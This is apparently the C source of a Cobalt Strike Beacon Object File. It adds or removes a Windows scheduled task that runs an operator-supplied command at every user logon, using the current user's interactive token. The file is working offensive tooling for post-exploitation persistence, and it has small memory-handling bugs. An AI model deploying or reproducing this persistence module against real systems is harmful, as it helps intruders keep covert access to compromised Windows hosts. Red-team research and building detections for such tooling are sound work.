#define SECURITY_WIN32
#include <windows.h>
#include <taskschd.h>
#include "beacon.h"
#include "bofdefs.h"

// Converts a char string to a BSTR
BSTR charToBSTR(const char *input) {
    if (input == NULL) {
        return NULL;
    }

    int len = KERNEL32$MultiByteToWideChar(CP_ACP, 0, input, -1, NULL, 0);
    if (len == 0) {
        return NULL;
    }

    wchar_t *wString = (wchar_t *)OLE32$CoTaskMemAlloc(len * sizeof(wchar_t));
    if (wString == NULL) {
        return NULL;
    }

    KERNEL32$MultiByteToWideChar(CP_ACP, 0, input, -1, wString, len);
    BSTR bstr = OLEAUT32$SysAllocString(wString);
    OLE32$CoTaskMemFree(wString);

    return bstr;
}

// Retrieves the current user's name in the specified format
char *GetUser(EXTENDED_NAME_FORMAT NameFormat) {
    char *UsrBuf = intAlloc(MAX_PATH);
    ULONG UsrSiz = MAX_PATH;

    if (UsrBuf == NULL) {
        return NULL;
    }

    if (SECUR32$GetUserNameExA(NameFormat, UsrBuf, &UsrSiz)) {
        return UsrBuf;
    }

    intFree(UsrBuf);
    return NULL;
}

// Retrieves token information for the current process
VOID *GetTokenInfo(TOKEN_INFORMATION_CLASS TokenType) {
    HANDLE hToken = 0;
    DWORD dwLength = 0;
    VOID *pTokenInfo = NULL;

    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_READ, &hToken)) {
        ADVAPI32$GetTokenInformation(hToken, TokenType, NULL, 0, &dwLength);

        if (KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            pTokenInfo = intAlloc(dwLength);
            if (pTokenInfo == NULL) {
                KERNEL32$CloseHandle(hToken);
                return NULL;
            }
        }

        if (!ADVAPI32$GetTokenInformation(hToken, TokenType, (LPVOID)pTokenInfo, dwLength, &dwLength)) {
            intFree(pTokenInfo);
            pTokenInfo = NULL;
        }

        KERNEL32$CloseHandle(hToken);
    }

    return pTokenInfo;
}

// Retrieves user information and stores it in userStr
void GetUserInfo(char **userStr) {
    PTOKEN_USER pUserInfo = NULL;
    *userStr = NULL;

    pUserInfo = (PTOKEN_USER)GetTokenInfo(TokenUser);
    if (pUserInfo == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get token information.\n");
        return;
    }

    *userStr = GetUser(NameSamCompatible);
    if (*userStr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get user name.\n");
    }

    if (pUserInfo) {
        intFree(pUserInfo);
    }

    if (*userStr == NULL && *userStr) {
        intFree(*userStr);
        *userStr = NULL;
    }
}

// Removes a scheduled task
DWORD removeTask(char *taskName) {
    VARIANT Nullv;
    OLEAUT32$VariantInit(&Nullv);
    Nullv.vt = VT_EMPTY;

    IID CTaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to initialize COM library: 0x%lX\n", hr);
        return (DWORD)hr;
    }

    ITaskService *pService = NULL;
    hr = OLE32$CoCreateInstance(&CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IIDTaskService, (void **)&pService);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create an instance of ITaskService. Ensure Task Scheduler service is running: 0x%lX\n", hr);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    hr = pService->lpVtbl->Connect(pService, Nullv, Nullv, Nullv, Nullv);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ITaskService->Connect failed. Could not connect to Task Scheduler service: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskFolder *pRootFolder = NULL;
    BSTR rootFolderPath = OLEAUT32$SysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, rootFolderPath, &pRootFolder);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get Root Folder pointer. Check if the Task Scheduler service is accessible: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR bStrTaskName = charToBSTR(taskName);
    hr = pRootFolder->lpVtbl->DeleteTask(pRootFolder, bStrTaskName, 0);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Error removing task '%s'. Ensure the task exists and you have the necessary permissions: 0x%lx\n", taskName, hr);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Task '%s' successfully removed.\n", taskName);
    }

    pRootFolder->lpVtbl->Release(pRootFolder);
    pService->lpVtbl->Release(pService);
    OLEAUT32$SysFreeString(bStrTaskName);
    OLEAUT32$SysFreeString(rootFolderPath);
    OLE32$CoUninitialize();

    return (DWORD)hr;
}

// Creates a scheduled task
DWORD createTask(char *taskName, char *command) {
    VARIANT Nullv;
    OLEAUT32$VariantInit(&Nullv);
    Nullv.vt = VT_EMPTY;
    char *userStr = NULL;

    IID CTaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
    IID IIDLogonTrigger = {0x72dade38, 0xfae4, 0x4b3e, {0xba, 0xf4, 0x5d, 0x00, 0x9a, 0xf0, 0x2b, 0x1c}};
    IID IIDExecAction = {0x4c3d624d, 0xfd6b, 0x49a3, {0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47}};

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to initialize COM library: 0x%lX\n", hr);
        return (DWORD)hr;
    }

    ITaskService *pService = NULL;
    hr = OLE32$CoCreateInstance(&CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IIDTaskService, (void **)&pService);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create an instance of ITaskService. Ensure Task Scheduler service is running: 0x%lX\n", hr);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    hr = pService->lpVtbl->Connect(pService, Nullv, Nullv, Nullv, Nullv);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ITaskService->Connect failed. Could not connect to Task Scheduler service: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskFolder *pRootFolder = NULL;
    BSTR rootFolderPath = OLEAUT32$SysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, rootFolderPath, &pRootFolder);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get Root Folder pointer. Check if the Task Scheduler service is accessible: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskDefinition *pTask = NULL;
    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create a new task definition: 0x%lx\n", hr);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    GetUserInfo(&userStr);

    IPrincipal *pPrincipal = NULL;
    hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get principal pointer: 0x%lx\n", hr);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR userBstr = charToBSTR(userStr);
    pPrincipal->lpVtbl->put_UserId(pPrincipal, userBstr);
    pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);

    ITriggerCollection *pTriggerCollection = NULL;
    hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get triggers collection: 0x%lx\n", hr);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITrigger *pTrigger = NULL;
    hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_LOGON, &pTrigger);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create logon trigger: 0x%lx\n", hr);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ILogonTrigger *pLogonTrigger = NULL;
    hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDLogonTrigger, (void **)&pLogonTrigger);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "QueryInterface call failed for ILogonTrigger: 0x%lx\n", hr);
        pTrigger->lpVtbl->Release(pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR logonTriggerId = charToBSTR(taskName);
    pLogonTrigger->lpVtbl->put_Id(pLogonTrigger, logonTriggerId);
    pLogonTrigger->lpVtbl->put_Enabled(pLogonTrigger, TRUE);
    pLogonTrigger->lpVtbl->put_UserId(pLogonTrigger, userBstr);

    IActionCollection *pActionCollection = NULL;
    hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get action collection: 0x%lx\n", hr);
        pLogonTrigger->lpVtbl->Release(pLogonTrigger);
        pTrigger->lpVtbl->Release(pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    IAction *pAction = NULL;
    hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create action: 0x%lx\n", hr);
        pActionCollection->lpVtbl->Release(pActionCollection);
        pLogonTrigger->lpVtbl->Release(pLogonTrigger);
        pTrigger->lpVtbl->Release(pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    IExecAction *pExecAction = NULL;
    hr = pAction->lpVtbl->QueryInterface(pAction, &IIDExecAction, (void **)&pExecAction);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "QueryInterface call failed for IExecAction: 0x%lx\n", hr);
        pAction->lpVtbl->Release(pAction);
        pActionCollection->lpVtbl->Release(pActionCollection);
        pLogonTrigger->lpVtbl->Release(pLogonTrigger);
        pTrigger->lpVtbl->Release(pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR execPath = charToBSTR(command);
    pExecAction->lpVtbl->put_Path(pExecAction, execPath);

    IRegisteredTask *pRegisteredTask = NULL;
    BSTR bStrTaskName = charToBSTR(taskName);
    hr = pRootFolder->lpVtbl->RegisterTaskDefinition(pRootFolder, bStrTaskName, pTask, TASK_CREATE_OR_UPDATE, Nullv, Nullv, TASK_LOGON_INTERACTIVE_TOKEN, Nullv, &pRegisteredTask);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Error saving task. Ensure you have the necessary permissions: 0x%lx\n", hr);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Task \"%s\" successfully registered to run at logon:\n%s\n", taskName, command);
    }

    if (pRegisteredTask) {
        pRegisteredTask->lpVtbl->Release(pRegisteredTask);
    }

    pExecAction->lpVtbl->Release(pExecAction);
    pAction->lpVtbl->Release(pAction);
    pActionCollection->lpVtbl->Release(pActionCollection);
    pLogonTrigger->lpVtbl->Release(pLogonTrigger);
    pTrigger->lpVtbl->Release(pTrigger);
    pTriggerCollection->lpVtbl->Release(pTriggerCollection);
    pPrincipal->lpVtbl->Release(pPrincipal);
    pTask->lpVtbl->Release(pTask);
    pRootFolder->lpVtbl->Release(pRootFolder);
    pService->lpVtbl->Release(pService);
    OLEAUT32$SysFreeString(bStrTaskName);
    OLEAUT32$SysFreeString(execPath);
    OLEAUT32$SysFreeString(userBstr);
    OLEAUT32$SysFreeString(rootFolderPath);
    if (userStr) {
        KERNEL32$LocalFree(userStr);
    }
    OLE32$CoUninitialize();

    return (DWORD)hr;
}

// Main function to parse and execute commands
void go(char *buff, int len) {
    HRESULT hr;
    char *action;
    char *taskName;
    char *cmd;
    datap parser;

    BeaconDataParse(&parser, buff, len);

    action = BeaconDataExtract(&parser, NULL);
    taskName = BeaconDataExtract(&parser, NULL);
    cmd = BeaconDataExtract(&parser, NULL);

    if (action == NULL || taskName == NULL || cmd == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error extracting data.\n");
        return;
    }

    if (MSVCRT$strcmp(action, "add") == 0) {
        hr = createTask(taskName, cmd);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "Task not created. Error code: 0x%lX\n", hr);
        }
    } else if (MSVCRT$strcmp(action, "remove") == 0) {
        hr = removeTask(taskName);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "Task not removed. Error code: 0x%lX\n", hr);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Invalid action specified.\n");
    }
}
